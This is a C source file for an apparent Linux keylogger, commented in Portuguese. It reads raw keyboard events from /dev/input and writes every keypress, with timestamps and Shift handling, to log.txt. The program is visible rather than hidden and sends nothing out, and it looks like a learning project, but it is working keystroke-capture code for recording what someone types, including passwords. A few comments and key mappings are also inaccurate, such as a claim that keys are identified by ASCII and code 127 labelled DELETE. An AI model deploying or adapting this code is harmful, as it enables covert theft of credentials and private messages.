#include <stdio.h>
#include <unistd.h>
#include <linux/input.h>
#include "keylogger.h"

int main() {
    int tec = procurar_teclado();
    
    if(tec == -1) {
        printf("Não achou nada!\n");
        printf("Tenta sudo ./nome_do_progama\n");
        return 1;
    }
    
    printf("\nteclado funcionando, aperta ctrl+c pra parar\n");
    
    FILE *log = fopen("log.txt", "a");
    if(log == NULL) {
        printf("deu erro no arquivo log.txt\n");
        return 1;
    }
    
    struct input_event e;
    int shift = 0;
    
    while(1) {
        int r = read(tec, &e, sizeof(e));
        if(r < 0) {
            printf("Erro ao ler /dev");
            break;
        }
        
        // se for tecla
        if(e.type == 1) {
            // shift apertado ou solto
            if(e.code == 42 || e.code == 54) {
                if(e.value == 1) {
                    shift = 1;
                } else {
                    shift = 0;
                }
                continue;
            }
            
            // so quando aperta (value=1)
            if(e.value == 1) {
                char horario[20];
                pegar_horario(horario, sizeof(horario));
                
                fprintf(stderr, "DEBUG: e.code=%d, teclas[e.code]=%d, value=%d\n", e.code, (e.code < 200 ? teclas[e.code] : -1), e.value);
                fflush(stderr);
                
                // tenta converter tecla normal
                if(e.code < 200 && teclas[e.code] != 0) {
                    char letra = teclas[e.code];
                    
                    if(shift == 1 && letra >= 'a' && letra <= 'z') {
                        letra = letra - 32;
                    }
                    
                    fprintf(stderr, "[%s] Tecla: '%c'\n", horario, letra);
                    fflush(stderr);
                    fprintf(log, "[%s] '%c'\n", horario, letra);
                }
                else {
                    // teclas especiais
                    char *nome_tecla = "";
                    // reconhecimento de teclas especiais usando ascii para identificação
                    switch(e.code) {
                        case 28:
                            nome_tecla = "ENTER";
                            fprintf(stderr, "[%s] Tecla: ENTER\n", horario);
                            fflush(stderr);
                            break;
                        case 14:
                            nome_tecla = "BACKSPACE";
                            fprintf(stderr, "[%s] Tecla: BACKSPACE\n", horario);
                            fflush(stderr);
                            break;
                        case 57:
                            nome_tecla = "ESPACO";
                            fprintf(stderr, "[%s] Tecla: ESPACO\n", horario);
                            fflush(stderr);
                            break;
                        case 15:
                            nome_tecla = "TAB";
                            fprintf(stderr, "[%s] Tecla: TAB\n", horario);
                            fflush(stderr);
                            break;
                        case 1:
                            nome_tecla = "ESC";
                            fprintf(stderr, "[%s] Tecla: ESC\n", horario);
                            fflush(stderr);
                            break;
                        case 103:
                            nome_tecla = "SETA_CIMA";
                            fprintf(stderr, "[%s] Tecla: SETA_CIMA\n", horario);
                            fflush(stderr);
                            break;
                        case 108:
                            nome_tecla = "SETA_BAIXO";
                            fprintf(stderr, "[%s] Tecla: SETA_BAIXO\n", horario);
                            fflush(stderr);
                            break;
                        case 105:
                            nome_tecla = "SETA_ESQUERDA";
                            fprintf(stderr, "[%s] Tecla: SETA_ESQUERDA\n", horario);
                            fflush(stderr);
                            break;
                        case 106:
                            nome_tecla = "SETA_DIREITA";
                            fprintf(stderr, "[%s] Tecla: SETA_DIREITA\n", horario);
                            fflush(stderr);
                            break;
                        case 127:
                            nome_tecla = "DELETE";
                            fprintf(stderr, "[%s] Tecla: DELETE\n", horario);
                            fflush(stderr);
                            break;
                        case 58:
                            nome_tecla = "CAPS_LOCK";
                            fprintf(stderr, "[%s] Tecla: CAPS_LOCK\n", horario);
                            fflush(stderr);
                            break;
                        default:
                            nome_tecla = "DESCONHECIDA";
                            fprintf(stderr, "[%s] Tecla: DESCONHECIDA[%d]\n", horario, e.code);
                            fflush(stderr);
                            break;
                    }
                    
                    fprintf(log, "[%s] %s\n", horario, nome_tecla);
                }
                
                // força escrever no arquivo
                fflush(log);
            }
        }
    }
    
    fclose(log);
    close(tec);
    return 0;
}